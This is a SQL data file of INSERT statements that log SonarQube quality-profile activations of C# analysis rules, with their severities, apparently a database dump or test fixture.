INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (19, '2017-11-16 07:37:01.985', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2930;ruleKey=csharpsquid:S2930;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnUhbbGRdfPp-qdB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (20, '2017-11-16 07:37:01.995', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2997;ruleKey=csharpsquid:S2997;profileKey=cs-sonar-way-07093;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnUrbbGRdfPp-qdC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (21, '2017-11-16 07:37:01.999', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2953;ruleKey=csharpsquid:S2953;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnUvbbGRdfPp-qdD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (22, '2017-11-16 07:37:02.005', NULL, 'key=cs-sonar-way-07093:csharpsquid:S108;ruleKey=csharpsquid:S108;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnU1bbGRdfPp-qdE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (23, '2017-11-16 07:37:02.009', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1116;ruleKey=csharpsquid:S1116;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnU5bbGRdfPp-qdF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (24, '2017-11-16 07:37:02.015', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2291;ruleKey=csharpsquid:S2291;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnU_bbGRdfPp-qdG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (25, '2017-11-16 07:37:02.026', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2344;ruleKey=csharpsquid:S2344;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVKbbGRdfPp-qdH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (26, '2017-11-16 07:37:02.032', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1244;ruleKey=csharpsquid:S1244;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVQbbGRdfPp-qdI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (27, '2017-11-16 07:37:02.036', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2933;ruleKey=csharpsquid:S2933;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVUbbGRdfPp-qdJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (28, '2017-11-16 07:37:02.04', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2345;ruleKey=csharpsquid:S2345;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVYbbGRdfPp-qdK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (29, '2017-11-16 07:37:02.044', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2346;ruleKey=csharpsquid:S2346;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVcbbGRdfPp-qdL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (30, '2017-11-16 07:37:02.048', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3217;ruleKey=csharpsquid:S3217;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVgbbGRdfPp-qdM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (31, '2017-11-16 07:37:02.058', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3376;ruleKey=csharpsquid:S3376;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVqbbGRdfPp-qdN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (32, '2017-11-16 07:37:02.063', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2934;ruleKey=csharpsquid:S2934;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnVubbGRdfPp-qdO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (33, '2017-11-16 07:37:02.069', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3246;ruleKey=csharpsquid:S3246;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnV1bbGRdfPp-qdP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (34, '2017-11-16 07:37:02.079', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2326;ruleKey=csharpsquid:S2326;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnV_bbGRdfPp-qdQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (35, '2017-11-16 07:37:02.083', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3249;ruleKey=csharpsquid:S3249;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnWDbbGRdfPp-qdR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (36, '2017-11-16 07:37:02.087', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2328;ruleKey=csharpsquid:S2328;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnWHbbGRdfPp-qdS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (37, '2017-11-16 07:37:02.091', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2219;ruleKey=csharpsquid:S2219;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnWLbbGRdfPp-qdT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (38, '2017-11-16 07:37:02.095', NULL, 'key=cs-sonar-way-07093:csharpsquid:S907;ruleKey=csharpsquid:S907;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnWPbbGRdfPp-qdU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (39, '2017-11-16 07:37:02.099', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3397;ruleKey=csharpsquid:S3397;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnWTbbGRdfPp-qdV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (40, '2017-11-16 07:37:02.11', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1066;ruleKey=csharpsquid:S1066;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnWebbGRdfPp-qdW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (41, '2017-11-16 07:37:02.153', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1145;ruleKey=csharpsquid:S1145;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXJbbGRdfPp-qdX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (42, '2017-11-16 07:37:02.157', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2692;ruleKey=csharpsquid:S2692;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXNbbGRdfPp-qdY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (43, '2017-11-16 07:37:02.162', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3444;ruleKey=csharpsquid:S3444;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXSbbGRdfPp-qdZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (44, '2017-11-16 07:37:02.168', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2278;ruleKey=csharpsquid:S2278;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXYbbGRdfPp-qda');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (45, '2017-11-16 07:37:02.174', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1944;ruleKey=csharpsquid:S1944;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXebbGRdfPp-qdb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (46, '2017-11-16 07:37:02.182', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3220;ruleKey=csharpsquid:S3220;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXmbbGRdfPp-qdc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (47, '2017-11-16 07:37:02.186', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2184;ruleKey=csharpsquid:S2184;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXqbbGRdfPp-qdd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (48, '2017-11-16 07:37:02.19', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1185;ruleKey=csharpsquid:S1185;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXubbGRdfPp-qde');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (49, '2017-11-16 07:37:02.194', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3218;ruleKey=csharpsquid:S3218;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnXybbGRdfPp-qdf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (50, '2017-11-16 07:37:02.199', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3427;ruleKey=csharpsquid:S3427;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnX3bbGRdfPp-qdg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (51, '2017-11-16 07:37:02.207', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1006;ruleKey=csharpsquid:S1006;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnX-bbGRdfPp-qdh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (52, '2017-11-16 07:37:02.21', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3262;ruleKey=csharpsquid:S3262;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYCbbGRdfPp-qdi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (53, '2017-11-16 07:37:02.214', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3450;ruleKey=csharpsquid:S3450;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYGbbGRdfPp-qdj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (54, '2017-11-16 07:37:02.219', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1172;ruleKey=csharpsquid:S1172;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYLbbGRdfPp-qdk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (55, '2017-11-16 07:37:02.224', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2681;ruleKey=csharpsquid:S2681;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYQbbGRdfPp-qdl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (56, '2017-11-16 07:37:02.234', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3265;ruleKey=csharpsquid:S3265;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYabbGRdfPp-qdm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (57, '2017-11-16 07:37:02.238', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1848;ruleKey=csharpsquid:S1848;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYebbGRdfPp-qdn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (58, '2017-11-16 07:37:02.242', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2360;ruleKey=csharpsquid:S2360;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYhbbGRdfPp-qdo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (59, '2017-11-16 07:37:02.245', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3466;ruleKey=csharpsquid:S3466;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYlbbGRdfPp-qdp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (60, '2017-11-16 07:37:02.25', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3451;ruleKey=csharpsquid:S3451;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnYqbbGRdfPp-qdq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (61, '2017-11-16 07:37:02.263', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3447;ruleKey=csharpsquid:S3447;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnY2bbGRdfPp-qdr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (62, '2017-11-16 07:37:02.268', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3169;ruleKey=csharpsquid:S3169;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnY8bbGRdfPp-qds');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (63, '2017-11-16 07:37:02.272', NULL, 'key=cs-sonar-way-07093:csharpsquid:S927;ruleKey=csharpsquid:S927;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZAbbGRdfPp-qdt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (64, '2017-11-16 07:37:02.278', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2234;ruleKey=csharpsquid:S2234;profileKey=cs-sonar-way-07093;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZGbbGRdfPp-qdu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (65, '2017-11-16 07:37:02.292', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3251;ruleKey=csharpsquid:S3251;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZUbbGRdfPp-qdv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (66, '2017-11-16 07:37:02.296', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2372;ruleKey=csharpsquid:S2372;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZYbbGRdfPp-qdw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (67, '2017-11-16 07:37:02.3', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2292;ruleKey=csharpsquid:S2292;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZcbbGRdfPp-qdx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (68, '2017-11-16 07:37:02.305', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2376;ruleKey=csharpsquid:S2376;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZhbbGRdfPp-qdy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (69, '2017-11-16 07:37:02.31', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2368;ruleKey=csharpsquid:S2368;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZmbbGRdfPp-qdz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (70, '2017-11-16 07:37:02.319', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1905;ruleKey=csharpsquid:S1905;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZvbbGRdfPp-qd0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (71, '2017-11-16 07:37:02.323', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1939;ruleKey=csharpsquid:S1939;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZzbbGRdfPp-qd1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (72, '2017-11-16 07:37:02.327', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3456;ruleKey=csharpsquid:S3456;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZ3bbGRdfPp-qd2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (73, '2017-11-16 07:37:02.331', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1698;ruleKey=csharpsquid:S1698;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZ7bbGRdfPp-qd3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (74, '2017-11-16 07:37:02.335', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2995;ruleKey=csharpsquid:S2995;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnZ_bbGRdfPp-qd4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (75, '2017-11-16 07:37:02.339', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2757;ruleKey=csharpsquid:S2757;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnaDbbGRdfPp-qd5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (76, '2017-11-16 07:37:02.347', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1656;ruleKey=csharpsquid:S1656;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnaKbbGRdfPp-qd6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (77, '2017-11-16 07:37:02.355', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3449;ruleKey=csharpsquid:S3449;profileKey=cs-sonar-way-07093;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnaSbbGRdfPp-qd7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (78, '2017-11-16 07:37:02.359', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1697;ruleKey=csharpsquid:S1697;profileKey=cs-sonar-way-07093;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnaXbbGRdfPp-qd8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (79, '2017-11-16 07:37:02.363', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2437;ruleKey=csharpsquid:S2437;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnaabbGRdfPp-qd9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (80, '2017-11-16 07:37:02.367', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2743;ruleKey=csharpsquid:S2743;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnafbbGRdfPp-qd-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (81, '2017-11-16 07:37:02.371', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3263;ruleKey=csharpsquid:S3263;profileKey=cs-sonar-way-07093;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnajbbGRdfPp-qd_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (82, '2017-11-16 07:37:02.375', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2223;ruleKey=csharpsquid:S2223;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnanbbGRdfPp-qeA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (83, '2017-11-16 07:37:02.383', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2696;ruleKey=csharpsquid:S2696;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnaubbGRdfPp-qeB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (84, '2017-11-16 07:37:02.387', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1643;ruleKey=csharpsquid:S1643;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnazbbGRdfPp-qeC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (85, '2017-11-16 07:37:02.392', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2275;ruleKey=csharpsquid:S2275;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwna4bbGRdfPp-qeD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (86, '2017-11-16 07:37:02.397', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3457;ruleKey=csharpsquid:S3457;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwna8bbGRdfPp-qeE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (87, '2017-11-16 07:37:02.402', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1449;ruleKey=csharpsquid:S1449;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbCbbGRdfPp-qeF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (88, '2017-11-16 07:37:02.406', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3234;ruleKey=csharpsquid:S3234;profileKey=cs-sonar-way-07093;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbGbbGRdfPp-qeG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (89, '2017-11-16 07:37:02.411', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3216;ruleKey=csharpsquid:S3216;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbLbbGRdfPp-qeH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (90, '2017-11-16 07:37:02.416', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2758;ruleKey=csharpsquid:S2758;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbQbbGRdfPp-qeI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (91, '2017-11-16 07:37:02.422', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3005;ruleKey=csharpsquid:S3005;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbWbbGRdfPp-qeJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (92, '2017-11-16 07:37:02.426', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2996;ruleKey=csharpsquid:S2996;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbabbGRdfPp-qeK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (93, '2017-11-16 07:37:02.434', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2225;ruleKey=csharpsquid:S2225;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbibbGRdfPp-qeL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (94, '2017-11-16 07:37:02.438', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3443;ruleKey=csharpsquid:S3443;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbmbbGRdfPp-qeM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (95, '2017-11-16 07:37:02.443', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2761;ruleKey=csharpsquid:S2761;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbrbbGRdfPp-qeN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (96, '2017-11-16 07:37:02.446', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1144;ruleKey=csharpsquid:S1144;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbubbGRdfPp-qeO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (97, '2017-11-16 07:37:02.45', NULL, 'key=cs-sonar-way-07093:csharpsquid:S3237;ruleKey=csharpsquid:S3237;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnbybbGRdfPp-qeP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (98, '2017-11-16 07:37:02.455', NULL, 'key=cs-sonar-way-07093:csharpsquid:S2123;ruleKey=csharpsquid:S2123;profileKey=cs-sonar-way-07093;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnb2bbGRdfPp-qeQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (99, '2017-11-16 07:37:02.459', NULL, 'key=cs-sonar-way-07093:csharpsquid:S1117;ruleKey=csharpsquid:S1117;profileKey=cs-sonar-way-07093;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnb7bbGRdfPp-qeR');
